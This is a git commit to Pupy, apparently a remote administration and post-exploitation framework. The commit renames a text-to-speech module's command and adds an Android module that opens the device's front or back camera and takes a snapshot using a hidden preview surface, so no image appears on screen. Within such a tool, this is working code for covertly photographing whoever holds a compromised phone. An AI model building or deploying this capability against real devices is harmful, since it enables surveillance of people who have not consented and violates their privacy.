df849c390fdeb7baeac33d2befa29cd46aacf251
n1nj4sec <contact@n1nj4.eu>
2016-01-23 00:28:38 +0100

    camera front&back snapshots module for android !

--- pupy/modules/android_tts.py
+++ pupy/modules/android_tts.py
@@ -7,7 +7,7 @@ class AndroidTTS(PupyModule):
 	""" Pop up a custom message box """
 	dependencies=['pupydroid.text_to_speach']
 	def init_argparse(self):
-		self.arg_parser = PupyArgumentParser(prog="msgbox", description=self.__doc__)
+		self.arg_parser = PupyArgumentParser(prog="tts", description=self.__doc__)
 		self.arg_parser.add_argument('--lang', default='US', help='change the locale')
 		self.arg_parser.add_argument('text', help='text to speak out loud')
 
---
+++ pupy/packages/android/pupydroid/camera.py
@@ -0,0 +1,41 @@
+#!/usr/bin/env python
+# -*- coding: UTF8 -*-
+# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
+# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
+
+import jnius
+from jnius import autoclass, PythonJavaClass, java_method
+import time
+from threading import Event
+class PictureCallback(PythonJavaClass):
+	__javainterfaces__ = ['android/hardware/Camera$PictureCallback']
+	def __init__(self, event):
+		PythonJavaClass.__init__(self)
+		self.result=None
+		self.event=event
+	@java_method("([BLandroid/hardware/Camera;)V")
+	def onPictureTaken(self, data, camera):
+		self.result=data.tostring()
+		self.event.set()
+
+#ref: http://developer.android.com/reference/android/hardware/Camera.html
+def take_picture(cam_id=0):
+	Camera=autoclass("android.hardware.Camera")
+	c = Camera.open(cam_id)
+	try:
+		SurfaceTexture=autoclass("android.graphics.SurfaceTexture")
+		c.setPreviewTexture(SurfaceTexture(0))
+		c.startPreview()
+		#view = SurfaceView(0);
+		#c.setPreviewDisplay(view.getHolder());
+		e=Event()
+		pc=PictureCallback(e)
+		c.takePicture(None, None, pc)
+		e.wait()
+		return pc.result
+	finally:
+		c.release()
+		del e
+		del pc
+		del c
+
